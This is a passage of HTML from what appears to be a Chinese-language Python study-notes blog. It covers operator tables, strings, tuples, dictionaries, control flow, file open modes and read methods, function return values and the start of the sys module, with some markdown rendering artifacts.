a</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>-=</strong></td>\n<td style=\"text-align:left\"><strong>减法赋值运算符</strong></td>\n<td style=\"text-align:left\"><strong>c -= a 等效于 c = c - a</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">*<strong>=</strong></td>\n<td style=\"text-align:left\"><strong>乘法赋值运算符</strong></td>\n<td style=\"text-align:left\">*<em>c <em>= a 等效于 c = c * a</em></em></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>/=</strong></td>\n<td style=\"text-align:left\"><strong>除法赋值运算符</strong></td>\n<td style=\"text-align:left\"><strong>c /= a 等效于 c = c /a</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>%=</strong></td>\n<td style=\"text-align:left\"><strong>取模赋值运算符</strong></td>\n<td style=\"text-align:left\"><strong>c %= a 等效于 c = c % a</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>=</strong>**</td>\n<td style=\"text-align:left\"><strong>幂赋值运算符</strong></td>\n<td style=\"text-align:left\"><strong>c = a 等效于 c = c * * a</strong>**</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>//=</strong></td>\n<td style=\"text-align:left\"><strong>取整除赋值运算符</strong></td>\n<td style=\"text-align:left\"><strong>c //= a 等效于 c = c //a</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>位运算符</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>运算符</strong></th>\n<th style=\"text-align:left\"><strong>描述</strong></th>\n<th style=\"text-align:left\"><strong>实例</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>&amp;</strong></td>\n<td style=\"text-align:left\"><strong>按位与运算符：参与运算的两个值，如果两个相应位都为 1, 则该位的结果为 1, 否则为 0</strong></td>\n<td style=\"text-align:left\"><strong>(a &amp; b) 输出结果 12 ，二进制解释： 0000 1100</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>|</strong></td>\n<td style=\"text-align:left\"><strong>按位或运算符：只要对应的二个二进位有一个为 1 时，结果位就为 1。</strong></td>\n<td style=\"text-align:left\"><strong>(a | b) 输出结果 61 ，二进制解释： 0011 1101</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>^</strong></td>\n<td style=\"text-align:left\"><strong>按位异或运算符：当两对应的二进位相异时，结果为 1</strong></td>\n<td style=\"text-align:left\"><strong>(a ^ b) 输出结果 49 ，二进制解释： 0011 0001</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>~</strong></td>\n<td style=\"text-align:left\"><strong>按位取反运算符：对数据的每个二进制位取反，即把 1 变为 0, 把 0 变为 1 。~x 类似于 -x-1</strong></td>\n<td style=\"text-align:left\"><strong>(~a) 输出结果 -61 ，二进制解释： 1100 0011，在一个有符号二进制数的补码形式。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&lt;&lt;</strong></td>\n<td style=\"text-align:left\"><strong>左移动运算符：运算数的各二进位全部左移若干位，由 &lt;&lt; 右边的数字指定了移动的位数，高位丢弃，低位补 0。</strong></td>\n<td style=\"text-align:left\"><strong>a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&gt;&gt;</strong></td>\n<td style=\"text-align:left\"><strong>右移动运算符：把 &quot;&gt;&gt;&quot; 左边的运算数的各二进位全部右移若干位，&gt;&gt; 右边的数字指定了移动的位数</strong></td>\n<td style=\"text-align:left\"><strong>a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>逻辑运算符</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>运算符</strong></th>\n<th style=\"text-align:left\"><strong>逻辑表达式</strong></th>\n<th style=\"text-align:left\"><strong>描述</strong></th>\n<th style=\"text-align:left\"><strong>实例</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>and</strong></td>\n<td style=\"text-align:left\"><strong>x and y</strong></td>\n<td style=\"text-align:left\"><strong>布尔 &quot;与&quot; - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。</strong></td>\n<td style=\"text-align:left\"><strong>(a and b) 返回 20。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>or</strong></td>\n<td style=\"text-align:left\"><strong>x or y</strong></td>\n<td style=\"text-align:left\"><strong>布尔 &quot;或&quot; - 如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。</strong></td>\n<td style=\"text-align:left\"><strong>(a or b) 返回 10。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>not</strong></td>\n<td style=\"text-align:left\"><strong>not x</strong></td>\n<td style=\"text-align:left\"><strong>布尔 &quot;非&quot; - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</strong></td>\n<td style=\"text-align:left\"><strong>not (a and b) 返回 False</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>成员运算符</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>运算符</strong></th>\n<th><strong>描述</strong></th>\n<th style=\"text-align:left\"><strong>实例</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>in</strong></td>\n<td><strong>如果在指定的序列中找到值返回 True，否则返回 False。</strong></td>\n<td style=\"text-align:left\"><strong>x 在 y 序列中，如果 x 在 y 序列中返回 True。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>not in</strong></td>\n<td><strong>如果在指定的序列中没有找到值返回 True，否则返回 False。</strong></td>\n<td style=\"text-align:left\"><strong>x 不在 y 序列中，如果 x 不在 y 序列中返回 True。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>strip()</strong></td>\n<td><strong>只能移除字符串首尾的多余空格，也可用于移除类似空格等字符，如 * 等</strong></td>\n<td style=\"text-align:left\"><strong>分割字符串首尾空格</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>身份运算符</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>运算符</strong></th>\n<th style=\"text-align:left\"><strong>描述</strong></th>\n<th style=\"text-align:left\"><strong>实例</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>is</strong></td>\n<td style=\"text-align:left\"><strong>is 是判断两个标识符是不是引用自一个对象</strong></td>\n<td style=\"text-align:left\"><strong>x is y, 类似 id (x) == id (y) , 如果引用的是同一个对象则返回 True，否则返回 False</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>is not</strong></td>\n<td style=\"text-align:left\"><strong>is not 是判断两个标识符是不是引用自不同对象</strong></td>\n<td style=\"text-align:left\"><strong>x is not y ， 类似 id (a) != id (b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>运算符优先级</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>运算符</strong></th>\n<th style=\"text-align:left\"><strong>描述</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">******</td>\n<td style=\"text-align:left\"><strong>指数 (最高优先级)</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>~ + -</strong></td>\n<td style=\"text-align:left\"><strong>按位翻转，一元加号和减号 (最后两个的方法名为 +@ 和 -@)</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">*** / % //**</td>\n<td style=\"text-align:left\"><strong>乘，除，取模和取整除</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>+ -</strong></td>\n<td style=\"text-align:left\"><strong>加法减法</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&gt;&gt; &lt;&lt;</strong></td>\n<td style=\"text-align:left\"><strong>右移，左移运算符</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&amp;</strong></td>\n<td style=\"text-align:left\"><strong>位 'AND’</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>^ |</strong></td>\n<td style=\"text-align:left\"><strong>位运算符</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&lt;= &lt; &gt; &gt;=</strong></td>\n<td style=\"text-align:left\"><strong>比较运算符</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&lt;&gt; == !=</strong></td>\n<td style=\"text-align:left\"><strong>等于运算符</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">**= %= /= //= -= += *= <strong>=</strong></td>\n<td style=\"text-align:left\"><strong>赋值运算符</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>is is not</strong></td>\n<td style=\"text-align:left\"><strong>身份运算符</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>in not in</strong></td>\n<td style=\"text-align:left\"><strong>成员运算符</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>not and or</strong></td>\n<td style=\"text-align:left\"><strong>逻辑运算符</strong></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"字符串\"><a class=\"markdownIt-Anchor\" href=\"#字符串\">#</a> <strong>字符串</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Python 中字符串被定义为引号之间的字符集合。Python 支持使用成对的单引号或双引号，三引号（三个连续的单引号或者双引号）可以用来包含特殊字符。使用索引操作符（[ ]）和切片操作符（[ : ]）可以</span><br><span class=\"line\">得到子字符串。字符串有其特有的索引规则：第一个字符的索引是 0，最后一个字符的索引是−1。</span><br></pre></td></tr></table></figure>\n<h3 id=\"切片和\"><a class=\"markdownIt-Anchor\" href=\"#切片和\">#</a> <strong>切片和’’'</strong></h3>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106204746192.png\" alt=\"image-20201106204746192\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106204841872.png\" alt=\"image-20201106204841872\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">表和元组有几处重要的区别。列表元素用中括号（[ ]）包裹，元素的个数及元素的值可以改变。</span><br><span class=\"line\">元组元素用小括号（( )）包裹，不可以更改（尽管他们的内容可以）。元组可以看成是只读的列表。通过</span><br><span class=\"line\">切片运算（[ ] 和[ : ]）可以得到子集，这一点与字符串的使用方法一样。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106205101310.png\" alt=\"image-20201106205101310\"></strong></p>\n<h3 id=\"元组\"><a class=\"markdownIt-Anchor\" href=\"#元组\">#</a> <strong>元组</strong></h3>\n<p><strong>元组也可以进行切片运算，得到的结果也是元组（不能被修改）。</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106205331789.png\" alt=\"image-20201106205331789\"></strong></p>\n<h3 id=\"字典\"><a class=\"markdownIt-Anchor\" href=\"#字典\">#</a> <strong>字典</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字典是 Python 中的映射数据类型，工作原理类似 Perl 中的关联数组或哈希表，由键-值(key-value)</span><br><span class=\"line\">对构成。几乎所有类型的 Python 对象都可以用作键，不过一般还是以数字或者字符串最为常用。</span><br><span class=\"line\">值可以是任意类型的 Python 对象，字典元素用大括号（&#123; &#125;）包裹。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106205616891.png\" alt=\"image-20201106205616891\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106205710356.png\" alt=\"image-20201106205710356\"></strong></p>\n<h2 id=\"条件语句\"><a class=\"markdownIt-Anchor\" href=\"#条件语句\">#</a> <strong>条件语句</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if 判断条件：</span><br><span class=\"line\">    执行语句……</span><br><span class=\"line\">else：</span><br><span class=\"line\">    执行语句……</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106210320295.png\" alt=\"image-20201106210320295\"></strong></p>\n<p><strong>if 语句的判断条件可以用 &gt;（大于）、&lt;(小于)、==（等于）、&gt;=（大于等于）、&lt;=（小于等于）来表示其关系。</strong></p>\n<p><strong>当判断条件为多个值时，可以使用以下形式：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if 判断条件1:</span><br><span class=\"line\">    执行语句1……</span><br><span class=\"line\">elif 判断条件2:</span><br><span class=\"line\">    执行语句2……</span><br><span class=\"line\">elif 判断条件3:</span><br><span class=\"line\">    执行语句3……</span><br><span class=\"line\">else:</span><br><span class=\"line\">    执行语句4……</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106211018154.png\" alt=\"image-20201106211018154\"></strong></p>\n<p><strong>while 循环语句</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106211442004.png\" alt=\"image-20201106211442004\"></strong></p>\n<p><strong>for 语句</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">for iterating_var in sequence:</span><br><span class=\"line\">   statements(s)</span><br><span class=\"line\">对于按顺序迭代_var：</span><br><span class=\"line\">报表</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107093806309.png\" alt=\"image-20201107093806309\"></strong></p>\n<p><strong>range () 函数经常和 len () 函数一起用于字符串索引。在这里我们要显示每一个元素及其索引值。</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107094010643.png\" alt=\"image-20201107094010643\"></strong></p>\n<p><strong>求质数\t循环使用 else 语句</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107094635492.png\" alt=\"image-20201107094635492\"></strong></p>\n<p><strong>不过，这些循环有一个约束，你要么循环索引，要么循环元素。这导致了 enumerate () 函数的推出</strong><br>\n<strong>（Python2.3 新增）。它同时做到了这两点。</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107095256070.png\" alt=\"image-20201107095256070\"></strong></p>\n<h2 id=\"列表解析\"><a class=\"markdownIt-Anchor\" href=\"#列表解析\">#</a> <strong>列表解析</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107095444374.png\" alt=\"image-20201107095444374\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107095639864.png\" alt=\"image-20201107095639864\"></strong></p>\n<h2 id=\"open函数\"><a class=\"markdownIt-Anchor\" href=\"#open函数\">#</a> <strong>open 函数</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">函数语法</span><br><span class=\"line\">open(name[, mode[, buffering]])</span><br><span class=\"line\">参数说明：</span><br><span class=\"line\"></span><br><span class=\"line\">name : 一个包含了你要访问的文件名称的字符串值。</span><br><span class=\"line\"></span><br><span class=\"line\">mode : mode 决定了打开文件的模式：只读，写入，追加等。所有可取值见如下的完全列表。这个参数是非强制的，默认文件访问模式为只读(r)。</span><br><span class=\"line\"></span><br><span class=\"line\">buffering : 如果 buffering 的值被设为 0，就不会有寄存。如果 buffering 的值取 1，访问文件时会寄存行。如果将 buffering 的值设为大于 1 的整数，表明了这就是的寄存区的缓冲大小。如果取负值，寄存区的缓冲大小则为系统默认。</span><br></pre></td></tr></table></figure>\n<p><strong>不同模式打开文件的完全列表：</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>模式</strong></th>\n<th style=\"text-align:left\"><strong>描述</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>r</strong></td>\n<td style=\"text-align:left\"><strong>以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>rb</strong></td>\n<td style=\"text-align:left\"><strong>以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>r+</strong></td>\n<td style=\"text-align:left\"><strong>打开一个文件用于读写。文件指针将会放在文件的开头。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>rb+</strong></td>\n<td style=\"text-align:left\"><strong>以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>w</strong></td>\n<td style=\"text-align:left\"><strong>打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>wb</strong></td>\n<td style=\"text-align:left\"><strong>以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>w+</strong></td>\n<td style=\"text-align:left\"><strong>打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>wb+</strong></td>\n<td style=\"text-align:left\"><strong>以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>a</strong></td>\n<td style=\"text-align:left\"><strong>打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>ab</strong></td>\n<td style=\"text-align:left\"><strong>以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>a+</strong></td>\n<td style=\"text-align:left\"><strong>打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>ab+</strong></td>\n<td style=\"text-align:left\"><strong>以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>rU</strong></td>\n<td style=\"text-align:left\"><strong>以读方式打开，同时提供通用换行符支持 （PEP 278</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>rt</strong></td>\n<td style=\"text-align:left\"><strong>模式下，python 在读取文本时会自动把 \\r\\n 转换成 \\n.</strong></td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用 &#39;r&#39; 或 &#39;U&#39; 模式打开的文件必须是已经存在的。使用 &#39;w&#39; 模式打开的文件若存在则首先清空，</span><br><span class=\"line\">然后（重新）创建。以 &#39;a&#39; 模式打开的文件是为追加数据作准备的，所有写入的数据都将追加到文件的</span><br><span class=\"line\">末尾。即使你 seek 到了其他的地方。如果文件不存在，将被自动创建，类似以 &#39;w&#39; 模式打开文件。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109085648133.png\" alt=\"image-20201109085648133\"></strong></p>\n<h3 id=\"readreadlinereadlines\"><a class=\"markdownIt-Anchor\" href=\"#readreadlinereadlines\">#</a> <strong>read.readline.readlines</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read()方法</span><br><span class=\"line\">　　特点是：读取整个文件，将文件内容放到一个字符串变量中。</span><br><span class=\"line\">　　劣势是：如果文件非常大，尤其是大于内存时，无法使用read()方法。</span><br><span class=\"line\">　　</span><br><span class=\"line\">readline()方法</span><br><span class=\"line\">　　特点：readline()方法每次读取一行；返回的是一个字符串对象，保持当前行的内存</span><br><span class=\"line\">　　缺点：比readlines慢得多</span><br><span class=\"line\">readlines()方法</span><br><span class=\"line\">　　特点：一次性读取整个文件；自动将文件内容分析成一个行的列表。</span><br></pre></td></tr></table></figure>\n<h2 id=\"with-open-和-open\"><a class=\"markdownIt-Anchor\" href=\"#with-open-和-open\">#</a> <strong>with open 和 open</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用python的时候，会经常遇到文件数据库的open，但总会不小心忘了close</span><br><span class=\"line\"></span><br><span class=\"line\">用with open 语句就能很好的解决这个问题，它会在语句执行完后，自动执行close（）</span><br></pre></td></tr></table></figure>\n<p><strong>如果需要改变编码，必须引入 io 库，否则 python3 会报错</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109092717929.png\" alt=\"\"></strong></p>\n<p><strong>with open 运行后就关闭文件（代替 close）</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109093521654.png\" alt=\"image-20201109093521654\"></strong></p>\n<h3 id=\"file-对象方法\"><a class=\"markdownIt-Anchor\" href=\"#file-对象方法\">#</a> <strong>file 对象方法</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file.read([size])：size 未指定则返回整个文件，如果文件大小 &gt;2 倍内存则有问题，f.read()读到文件尾时返回&quot;&quot;(空字串)。</span><br><span class=\"line\"></span><br><span class=\"line\">file.readline()：返回一行。</span><br><span class=\"line\"></span><br><span class=\"line\">file.readlines([size]) ：返回包含size行的列表, size 未指定则返回全部行。</span><br><span class=\"line\"></span><br><span class=\"line\">for line in f: print line ：通过迭代器访问。</span><br><span class=\"line\"></span><br><span class=\"line\">f.write(&quot;hello\\n&quot;)：如果要写入字符串以外的数据,先将他转换为字符串。</span><br><span class=\"line\"></span><br><span class=\"line\">f.tell()：返回一个整数,表示当前文件指针的位置(就是到文件头的字节数)。</span><br><span class=\"line\"></span><br><span class=\"line\">f.seek(偏移量,[起始位置])：用来移动文件指针。</span><br><span class=\"line\"></span><br><span class=\"line\">偏移量: 单位为字节，可正可负</span><br><span class=\"line\">起始位置: 0 - 文件头, 默认值; 1 - 当前位置; 2 - 文件尾</span><br><span class=\"line\">f.close() 关闭文件</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107102029412.png\" alt=\"image-20201107102029412\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109094923167.png\" alt=\"image-20201109094923167\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109093910729.png\" alt=\"image-20201109093910729\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109095006923.png\" alt=\"image-20201109095006923\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109095054041.png\" alt=\"image-20201109095054041\"></strong></p>\n<h2 id=\"定义函数\"><a class=\"markdownIt-Anchor\" href=\"#定义函数\">#</a> <strong>定义函数</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107134017412.png\" alt=\"image-20201107134017412\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107134054158.png\" alt=\"image-20201107134054158\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">函数的返回值：</span><br><span class=\"line\">    return 值：只能返回一次，只要执行return函数就终止</span><br><span class=\"line\">    返回值：没有类型限制，也没有个数限制</span><br><span class=\"line\">        没有return：None</span><br><span class=\"line\">        返回一个值</span><br><span class=\"line\">        返回多个值：元组</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://images2015.cnblogs.com/blog/1168160/201706/1168160-20170613150346509-2048706927.png\" alt=\"img\"></strong></p>\n<h3 id=\"sys模块\"><a class=\"markdownIt-Anchor\" href=\"#sys模块\">#</a> <strong>sys 模块</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sys.argv: 实现从程序外部向程序传递参数。</span><br><span class=\"line\"></span><br><span class=\"line\">sys.exit([arg]): 程序中间的退出，arg&#x3D;0为正常退出。</span><br><span class=\"line\">sys.version  显示版本</span><br><span class=\"line\">sys.stdout.write(&#39;please:&#39;):标准输出，引出进度条的例子</span><br><span class=\"line\">sys.getrecursionlimit() :获取最大递归层数</span><br><span class=\"line\">sys.setrecursionlimit(1200):设置最大递归层数</span><br><span class=\"line\">sys.getdefaultencoding(): 获取系统当前编码，一般默认为ascii。</span><br><span class=\"line\">sys.setdefaultencoding(): 设置系统默认编码，执行dir（sys）时不会看到这个方法，在解释器中执行不通过，可以先执行reload(sys)，在执行 setdefaultencoding(&#39;utf8&#39;)，此时将系统默认编码设置为utf8。（见设置系统默认编码 ）</span><br><span class=\"line\"></span><br><span class=\"line\">sys.getfilesystemencoding(): 